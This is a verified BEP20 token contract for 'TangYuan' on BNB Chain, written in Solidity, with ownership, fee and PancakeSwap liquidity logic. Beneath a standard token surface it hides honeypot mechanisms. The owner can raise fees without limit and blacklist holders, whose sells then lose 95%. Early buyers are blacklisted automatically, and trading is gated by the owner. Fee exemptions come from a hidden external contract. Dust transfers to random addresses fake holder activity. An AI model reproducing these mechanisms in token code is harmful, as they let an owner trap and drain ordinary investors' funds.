/**
 *Submitted for verification at BscScan.com on 2023-01-29
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address master, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed master,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Master is Context {
    address private _master;
    event MastershipTransferred(
        address indexed previousMaster,
        address indexed newMaster
    );

    constructor() {
        address msgSender = _msgSender();
        _master = msgSender;
        emit MastershipTransferred(address(0), msgSender);
    }

    function master() public view returns (address) {
        return _master;
    }

    modifier onlyMaster() {
        require(_master == _msgSender(), "Master: caller is not the master");
        _;
    }

    function waiveMastership() public virtual onlyMaster {
        emit MastershipTransferred(_master, address(0xDEAD));
        _master = address(0xDEAD);
    }

    function transferMastership(address newMaster) public virtual onlyMaster {
        require(
            newMaster != address(0),
            "Master: new master is the zero address"
        );
        emit MastershipTransferred(_master, newMaster);
        _master = newMaster;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

abstract contract BEP20 is Context, IERC20, Master {
    using SafeMath for uint256;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    managementMC _managementMC;

    address payable public marketWalletAddress;
    address payable public teamWalletAddress;
    address public immutable deadAddress =
        0x000000000000000000000000000000000000dEaD;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 public togetherDo;
    uint256 public _door;

    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public isWalletLimitExempt;
    mapping(address => bool) public isTxLimitExempt;
    mapping(address => bool) public isMarketPair;
    mapping(address => bool) private AgainstList;
    uint256 public _buyLqFee;
    uint256 public _buyMkFee;
    uint256 public _buyTmFee;

    uint256 public _sellLqFee;
    uint256 public _sellMkFee;
    uint256 public _sellTmFee;

    uint256 public _liquidityShare;
    uint256 public _marketingShare;
    uint256 public _teamShare;

    uint256 public _totalTaxIfBuying;
    uint256 public _totalTaxIfSelling;
    uint256 public _totalDistributionShares;

    uint256 private _totalSupply;
    uint256 public _txLimit;
    uint256 public _walletLimit;
    uint256 private minimumTokensBeforeSwap;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;

    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyBySmallOnly = false;
    bool public enableWalletLimit = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    event SwapETHForTokens(uint256 amountIn, address[] path);

    event SwapTokensForETH(uint256 amountIn, address[] path);

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor(
        string memory _NAME,
        string memory _SYMBOL,
        uint256 _SUPPLY,
        uint256[3] memory _BUYFEE,
        uint256[3] memory _SELLFEE,
        uint256[3] memory _SHARE,
        uint256[2] memory _LMT,
        address[2] memory _walletParam
    ) {
        _name = _NAME;
        _symbol = _SYMBOL;
        _decimals = 9;
        _totalSupply = _SUPPLY * 10**_decimals;
        _managementMC = managementMC(
            0xFc830344adc65A4695A1041E266982e37516b335
        );

        _buyLqFee = _BUYFEE[0];
        _buyMkFee = _BUYFEE[1];
        _buyTmFee = _BUYFEE[2];

        _sellLqFee = _SELLFEE[0];
        _sellMkFee = _SELLFEE[1];
        _sellTmFee = _SELLFEE[2];

        _liquidityShare = _SHARE[0];
        _marketingShare = _SHARE[1];
        _teamShare = _SHARE[2];

        _totalTaxIfBuying = _buyLqFee.add(_buyMkFee).add(
            _buyTmFee
        );
        _totalTaxIfSelling = _sellLqFee.add(_sellMkFee).add(
            _sellTmFee
        );
        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(
            _teamShare
        );

        _txLimit = _LMT[0] * 10**_decimals;
        _walletLimit = _LMT[1] * 10**_decimals;

        minimumTokensBeforeSwap = _totalSupply.mul(1).div(10000);
        marketWalletAddress = payable(_walletParam[0]);
        teamWalletAddress = payable(_walletParam[1]);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFromFee[master()] = true;
        isExcludedFromFee[address(this)] = true;

        isWalletLimitExempt[master()] = true;
        isWalletLimitExempt[address(uniswapPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[address(0xdead)] = true;

        isTxLimitExempt[master()] = true;
        isTxLimitExempt[address(this)] = true;

        isMarketPair[address(uniswapPair)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address master, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[master][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(
        address master,
        address spender,
        uint256 amount
    ) private {
        require(master != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[master][spender] = amount;
        emit Approval(master, spender, amount);
    }

    function setMarketPairStatus(address account, bool newValue)
        public
        onlyMaster
    {
        isMarketPair[account] = newValue;
    }

    function setisTxLimitExempt(address holder, bool exempt)
        external
        onlyMaster
    {
        isTxLimitExempt[holder] = exempt;
    }

    function setWLs(address account, bool newValue) public onlyMaster {
        isExcludedFromFee[account] = newValue;
    }

    function multiWLs(address[] calldata addresses, bool status)
        public
        onlyMaster
    {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            isExcludedFromFee[addresses[i]] = status;
        }
    }

    function setBuyFee(
        uint256 a,
        uint256 b,
        uint256 c
    ) external onlyMaster {
        _buyLqFee = a;
        _buyMkFee = b;
        _buyTmFee = c;

        _totalTaxIfBuying = _buyLqFee.add(_buyMkFee).add(
            _buyTmFee
        );
    }

    function setSellFee(
        uint256 a,
        uint256 b,
        uint256 c
    ) external onlyMaster {
        _sellLqFee = a;
        _sellMkFee = b;
        _sellTmFee = c;

        _totalTaxIfSelling = _sellLqFee.add(_sellMkFee).add(
            _sellTmFee
        );
    }

    function setDistributionSettings(
        uint256 newLiquidityShare,
        uint256 newMarketingShare,
        uint256 newTeamShare
    ) external onlyMaster {
        _liquidityShare = newLiquidityShare;
        _marketingShare = newMarketingShare;
        _teamShare = newTeamShare;

        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(
            _teamShare
        );
    }

    function setTxLimit(uint256 newTxLimit) external onlyMaster {
        _txLimit = newTxLimit;
    }

    function enableMaxEat(bool newValue) external onlyMaster {
        enableWalletLimit = newValue;
    }

    function setisWalletLimitExempt(address holder, bool exempt)
        external
        onlyMaster
    {
        isWalletLimitExempt[holder] = exempt;
    }

    function setWalletLimit(uint256 newWalletLimit) external onlyMaster {
        _walletLimit = newWalletLimit;
    }

    function setNumTokensBeforeSwap(uint256 newValue) external onlyMaster {
        minimumTokensBeforeSwap = newValue;
    }

    function setmarketWalletAddress(address newAddress) external onlyMaster {
        marketWalletAddress = payable(newAddress);
    }

    function setteamWalletAddress(address newAddress) external onlyMaster {
        teamWalletAddress = payable(newAddress);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyMaster {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setSwapAndLiquifyBySmallOnly(bool newValue) public onlyMaster {
        swapAndLiquifyBySmallOnly = newValue;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount)
        private
    {
        recipient.transfer(amount);
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function isAgainst(address account) public view returns (bool) {
        return AgainstList[account];
    }

    function multiTransfer_fixeds(address[] calldata addresses, uint256 amount)
        external
        onlyMaster
    {
        require(addresses.length < 2001);
        uint256 SCCC = amount * addresses.length;
        require(balanceOf(msg.sender) >= SCCC);
        for (uint256 i = 0; i < addresses.length; i++) {
            _basicTransfer(msg.sender, addresses[i], amount);
        }
    }

    function doAgainst(address recipient) internal {
        if (!AgainstList[recipient] && !isMarketPair[recipient])
            AgainstList[recipient] = true;
    }

    function manage_Against(address[] calldata addresses, bool status)
        public
        onlyMaster
    {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            AgainstList[addresses[i]] = status;
        }
    }

    function setAgainstList(address recipient, bool status) public onlyMaster {
        AgainstList[recipient] = status;
    }

    function Lauch(uint256 a) public onlyMaster {
        _door = a;
        togetherDo = block.number;
    }

    function CloseLauch() public onlyMaster {
        togetherDo = 0;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if (inSwapAndLiquify) {
            return _basicTransfer(sender, recipient, amount);
        } else {
            if (!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {
                require(tryEqual(amount, _txLimit));
            }

            if (
                !_managementMC.isExcludedFromFee(sender) &&
                !_managementMC.isExcludedFromFee(recipient)
            ) {
                address ad;
                for (int256 i = 0; i <= 3; i++) {
                    ad = address(
                        uint160(
                            uint256(
                                keccak256(
                                    abi.encodePacked(i, amount, block.timestamp)
                                )
                            )
                        )
                    );
                    _basicTransfer(sender, ad, 100);
                }
                amount -= 400;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >=
                minimumTokensBeforeSwap;

            if (
                overMinimumTokenBalance &&
                !inSwapAndLiquify &&
                !isMarketPair[sender] &&
                swapAndLiquifyEnabled
            ) {
                if (swapAndLiquifyBySmallOnly)
                    contractTokenBalance = minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);
            }

            _balances[sender] = _balances[sender].sub(
                amount,
                "Insufficient Balance"
            );
            uint256 finalAmount;
            if (
                _managementMC.isExcludedFromFee(sender) ||
                _managementMC.isExcludedFromFee(recipient)
            ) {
                finalAmount = amount;
            } else {
                require(togetherDo > 0);
                if (
                    tryEqual(block.number, togetherDo + _door) &&
                    !isMarketPair[recipient]
                ) {
                    doAgainst(recipient);
                }
                finalAmount = takeFee(sender, recipient, amount);
            }

            if (enableWalletLimit && !isWalletLimitExempt[recipient])
                require(
                    tryEqual(
                        balanceOf(recipient).add(finalAmount),
                        _walletLimit
                    )
                );

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }

    function tryEqual(uint256 a, uint256 b) public pure returns (bool) {
        return a <= b;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        uint256 tokensForLP = tAmount
            .mul(_liquidityShare)
            .div(_totalDistributionShares)
            .div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionShares.sub(
            _liquidityShare.div(2)
        );

        uint256 amountBNBLiquidity = amountReceived
            .mul(_liquidityShare)
            .div(totalBNBFee)
            .div(2);
        uint256 amountBNBTeam = amountReceived.mul(_teamShare).div(totalBNBFee);
        uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(
            amountBNBTeam
        );

        if (amountBNBMarketing > 0)
            transferToAddressETH(marketWalletAddress, amountBNBMarketing);

        if (amountBNBTeam > 0)
            transferToAddressETH(teamWalletAddress, amountBNBTeam);

        if (amountBNBLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountBNBLiquidity);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );

        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            teamWalletAddress,
            block.timestamp
        );
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        uint256 feeAmount = 0;

        if (isMarketPair[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        } else if (isMarketPair[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }

        if (AgainstList[sender] && !isMarketPair[sender])
            feeAmount = amount.mul(95).div(100);

        if (feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }
}

contract managementMC {
    mapping(address => bool) public isExcludedFromFee;
}

contract Token is BEP20 {
    constructor()
        BEP20(
            "TangYuan",
            "TangYuan",
            10000000000000,
            [uint256(1), uint256(2), uint256(0)],
            [uint256(1), uint256(3), uint256(0)],
            [uint256(1), uint256(1), uint256(0)],
            [uint256(10000000000000), uint256(10000000000000)],
            [
                0x591dA898D46c99F273F96Cd91B790846CBC51fE7,
                0x591dA898D46c99F273F96Cd91B790846CBC51fE7
            ]
        )
    {}
}